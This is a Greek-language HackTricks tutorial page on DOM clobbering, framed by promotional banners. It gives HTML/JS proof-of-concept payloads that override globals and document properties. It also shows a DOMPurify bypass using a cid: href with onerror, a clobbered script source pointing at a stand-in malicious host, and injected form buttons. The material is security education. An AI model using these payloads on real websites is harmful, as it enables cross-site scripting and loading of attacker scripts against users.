# Dom Clobbering

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Βασικά**

Είναι δυνατόν να δημιουργήσετε **παγκόσμιες μεταβλητές μέσα στο περιβάλλον του JS** με τα χαρακτηριστικά **`id`** και **`name`** σε ετικέτες HTML.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**Μόνο** συγκεκριμένα στοιχεία μπορούν να χρησιμοποιήσουν το **`name attribute`** για να αντικαταστήσουν τις γενικές μεταβλητές, αυτά είναι: `embed`, `form`, `iframe`, `image`, `img` και `object`.

Ενδιαφέροντα, όταν χρησιμοποιείτε ένα στοιχείο **`form`** για να αντικαταστήσετε μια μεταβλητή, θα λάβετε την τιμή **`toString`** του ίδιου του στοιχείου: `[object HTMLFormElement]`, αλλά με το στοιχείο **`anchor`**, το **`toString`** θα είναι το **`href`** του anchor. Επομένως, αν αντικαταστήσετε χρησιμοποιώντας το στοιχείο **`a`**, μπορείτε να **ελέγξετε** την **τιμή** όταν αντιμετωπίζεται ως **συμβολοσειρά**:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### Πίνακες & Χαρακτηριστικά

Είναι επίσης δυνατό να **καταστρέψετε έναν πίνακα** και **χαρακτηριστικά αντικειμένων**:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
Για να καταργήσετε ένα **τρίτο χαρακτηριστικό** (π.χ. x.y.z), πρέπει να χρησιμοποιήσετε ένα **`form`**:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
Η αντικατάσταση περισσότερων χαρακτηριστικών είναι **πιο περίπλοκη αλλά εξακολουθεί να είναι δυνατή**, χρησιμοποιώντας iframes:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
Η ετικέτα style χρησιμοποιείται για να δώσει αρκετό χρόνο στο iframe να απεικονιστεί. Χωρίς αυτό, θα εμφανιστεί ένα αναπάντεχο μήνυμα **undefined**.
{% endhint %}

Για να αντικαταστήσετε βαθύτερα χαρακτηριστικά, μπορείτε να χρησιμοποιήσετε **iframes με κωδικοποίηση html** με τον εξής τρόπο:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **Παράκαμψη Φίλτρου**

Εάν ένα φίλτρο κάνει **επανάληψη** μέσω των **ιδιοτήτων** ενός κόμβου χρησιμοποιώντας κάτι σαν `document.getElementByID('x').attributes`, μπορείτε να **αντικαταστήσετε** την ιδιότητα **`.attributes`** και να **σπάσετε το φίλτρο**. Άλλες ιδιότητες του DOM όπως **`tagName`**, **`nodeName`** ή **`parentNode`** και άλλες μπορούν επίσης να **αντικατασταθούν**.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **Αντικατάσταση του `window.someObject`**

Στην JavaScript είναι συνηθισμένο να βρίσκουμε:
```javascript
var someObject = window.someObject || {};
```
Η παραπλάνηση του HTML στη σελίδα επιτρέπει την αντικατάσταση του `someObject` με έναν κόμβο DOM, πιθανώς εισάγοντας ευπάθειες ασφαλείας. Για παράδειγμα, μπορείτε να αντικαταστήσετε το `someObject` με ένα στοιχείο αγκύρωσης που δείχνει σε ένα κακόβουλο σενάριο:
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
Σε ένα ευάλωτο κώδικα όπως:
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
Αυτή η μέθοδος εκμεταλλεύεται την πηγή του script για να εκτελέσει μη επιθυμητό κώδικα.

**Κόλπο**: Το **`DOMPurify`** σας επιτρέπει να χρησιμοποιήσετε το πρωτόκολλο **`cid:`**, το οποίο **δεν κωδικοποιεί τις διπλές εισαγωγικές**. Αυτό σημαίνει ότι μπορείτε να **εισάγετε μια κωδικοποιημένη διπλή εισαγωγική που θα αποκωδικοποιηθεί κατά την εκτέλεση**. Επομένως, η εισαγωγή κάτι σαν **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** θα κάνει το κωδικοποιημένο HTML `&quot;` να **αποκωδικοποιηθεί κατά την εκτέλεση** και να **αποδράσει** από την τιμή του γνωρίσματος για να **δημιουργήσει** το γεγονός **`onerror`**.

Μια άλλη τεχνική χρησιμοποιεί ένα στοιχείο **`form`**. Ορισμένες βιβλιοθήκες πελάτη επιθεωρούν τα γνωρίσματα ενός νεοδημιουργημένου στοιχείου φόρμας για να τα καθαρίσουν. Ωστόσο, προσθέτοντας ένα `input` με `id=attributes` μέσα στη φόρμα, αντικαθιστάτε αποτελεσματικά την ιδιότητα γνωρισμάτων, εμποδίζοντας τον απολυμαντή να έχει πρόσβαση στα πραγματικά γνωρίσματα.

Μπορείτε να [**βρείτε ένα παράδειγμα αυτού του είδους του clobbering σε αυτό το CTF writeup**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## Clobbering αντικειμένου document

Σύμφωνα με την τεκμηρίωση, είναι δυνατό να αντικαταστήσετε γνωρίσματα του αντικειμένου document χρησιμοποιώντας το DOM Clobbering:

> Η διεπαφή [Document](https://html.spec.whatwg.org/multipage/dom.html#document) [υποστηρίζει ονομασμένες ιδιότητες](https://webidl.spec.whatwg.org/#dfn-support-named-properties). Οι [υποστηριζόμενες ονομασμένες ιδιότητες](https://webidl.spec.whatwg.org/#dfn-supported-property-names) ενός αντικειμένου [Document](https://html.spec.whatwg.org/multipage/dom.html#document) σε οποιαδήποτε στιγμή αποτελούνται από τα εξής, με σειρά δέντρου σύμφωνα με το στοιχείο που τα συνέβαλε, αγνοώντας τυχόν αργότερα διπλότυπα και με τιμές από τα γνωρίσματα [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) να έρχονται πριν από τις τιμές από τα γνωρίσματα name όταν το ίδιο στοιχείο συνεισφέρει και τα δύο:
>
> \- Η τιμή του γνωρίσματος περιεχομένου name για όλα τα [εκτεθειμένα](https://html.spec.whatwg.org/multipage/dom.html#exposed) στοιχεία [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) και [εκτεθειμένα](https://html.spec.whatwg.org/multipage/dom.html#exposed) στοιχεία [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) που έχουν ένα μη κενό γνώρισμα περιεχομένου name και είναι [σε ένα δέντρο εγγράφου](https://dom.spec.whatwg.org/#in-a-document-tree) με το έγγραφο ως [ρίζα](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- Η τιμή του γνωρίσματος περιεχομένου [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) για όλα τα [εκτεθειμένα](https://html.spec.whatwg.org/multipage/dom.html#exposed) στοιχεία [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) που έχουν ένα μη κενό γνώρισμα περιεχομένου [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) και είναι [σε ένα δέντρο εγγράφου](https://dom.spec.whatwg.org/#in-a-document-tree) με το έγγραφο ως [ρίζα](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- Η τιμή του γνωρίσματος περιεχομένου [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) για όλα τα στοιχεία [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) που έχουν τόσο ένα μη κενό γνώρισμα περιεχομένου [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) όσο και ένα μη κενό γνώρισμα περιεχομένου name και είναι [σε ένα δέντρο εγγράφου](https://dom.spec.whatwg.org/#in-a-document-tree) με το έγγραφο ως [ρίζα](https://dom.spec.whatwg.org/#concept-tree-root).

Χρησιμοποιώντας αυτήν την τεχνική, μπορείτε να αντικαταστήσετε συχνά χρησιμοποιούμενες **τιμές όπως `document.cookie`, `document.body`, `document.children`**, και ακόμα και μεθόδους στη διεπαφή Document όπως `document.querySelector`.
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2) [img, form, cookie: img]

typeof(document.cookie)
'object
```
## Γράψιμο μετά την αντικατάσταση του στοιχείου

Τα αποτελέσματα των κλήσεων στις **`document.getElementById()`** και **`document.querySelector()`** μπορούν να τροποποιηθούν εισάγοντας ένα ετικέτα `<html>` ή `<body>` με ένα ίδιο χαρακτηριστικό id. Ακολουθεί ο τρόπος με τον οποίο μπορεί να γίνει αυτό:
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
Επιπλέον, με τη χρήση στυλ για να κρύψετε αυτές τις εισαγμένες ετικέτες HTML/body, μπορεί να αποτραπεί η παρεμβολή από άλλο κείμενο στο `innerText`, βελτιώνοντας έτσι την αποτελεσματικότητα της επίθεσης:
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
Οι έρευνες για το SVG αποκάλυψαν ότι μια ετικέτα `<body>` μπορεί επίσης να χρησιμοποιηθεί αποτελεσματικά:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
Για να λειτουργήσει η ετικέτα HTML μέσα σε SVG σε προγράμματα περιήγησης όπως το Chrome και το Firefox, απαιτείται η χρήση της ετικέτας `<foreignobject>`:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Καταστροφή Φορμών

Είναι δυνατόν να προστεθούν **νέες καταχωρήσεις μέσα σε μια φόρμα** απλά **καθορίζοντας το χαρακτηριστικό `form`** μέσα σε ορισμένες ετικέτες. Μπορείτε να χρησιμοποιήσετε αυτό για να **προσθέσετε νέες τιμές μέσα σε μια φόρμα** και ακόμα να προσθέσετε ένα νέο **κουμπί** για να την **αποστείλετε** (clickjacking ή κατάχρηση κάποιου κώδικα JS `.click()`):

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* Για περισσότερα χαρακτηριστικά φόρμας στο [**button check this**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## Αναφορές

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript για χάκερς: Μάθετε να σκέφτεστε σαν έναν χάκερ.

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
